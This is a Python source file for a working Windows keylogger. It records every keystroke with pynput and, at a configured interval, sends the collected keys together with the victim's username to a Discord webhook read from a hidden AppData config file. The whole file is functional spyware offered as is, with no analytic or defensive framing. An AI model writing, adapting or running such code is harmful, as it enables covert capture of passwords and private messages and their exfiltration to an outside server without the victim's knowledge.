from multiprocessing.sharedctypes import Value
from pynput.keyboard import Listener
from os import getenv
from discord_webhook import *

import logging
import time

user = (getenv("USERNAME"))

pathtotime = "C:\\Users\\"+user+"\\AppData\\Roaming\\kl\\kltime.txt"
pathtoconfig = "C:\\Users\\"+user+"\\AppData\\Roaming\\kl\\klconfig.txt"

file = "kllog.txt"
logging.basicConfig(filename=file, level=logging.DEBUG, format="%(asctime)s %(message)s")
fichier = open(pathtoconfig, "r")
config = fichier.read().split('"')
webhookurl = config[1]
timebeforesend = int(config[3])
fichier.close()

run = True

message = []
messagetosend = ""
temps = ()
listfichier = []
listelu = []
liststr = ""
strtime = ""
localtime = ""

fichier = open(pathtotime, "w")
fichier.write(str(time.time()))
fichier.close()

while run == True:
    def on_press(key):
        global user
        global message
        global messagetosend
        global fichier
        global listfichier
        global temps
        global listelu
        global liststrt
        global strtime
        global localtime

        fichier = open(pathtotime, "r")
        listelu = fichier.read().split(".")
        liststr = listelu[0]
        inttimelist = str(time.time()).split(".")
        strtime = inttimelist[0]
        temps = int(strtime) - int(liststr)
        fichier.close()

        message.append(key)
        messagetosend =  '   '.join(str(e) for e in message)

        if temps >= timebeforesend:
            localtime = str(time.localtime()).split(",")

            webhook = DiscordWebhook(url=webhookurl,username="keylogger",content="",avatar_url="https://www.baccarat.fr/dw/image/v2/BBLJ_PRD/on/demandware.static/-/Sites-baccarat-master-products/default/dw93cea1f1/original/Coeur/1761585.jpg?sw=1700&sh=1700&sm=fit")
            
            embed = DiscordEmbed(title="Rapport KeyLoggger   *"+user+"*",color = 65280)
            
            embed.add_embed_field(value=str(time.localtime()), name=messagetosend)

            webhook.add_embed(embed)
            response = webhook.execute()

            message = []
            fichier = open(pathtotime, "w")
            fichier.write(str(time.time()))
            fichier.close()

    with Listener(on_press=on_press) as listener:
        listener.join()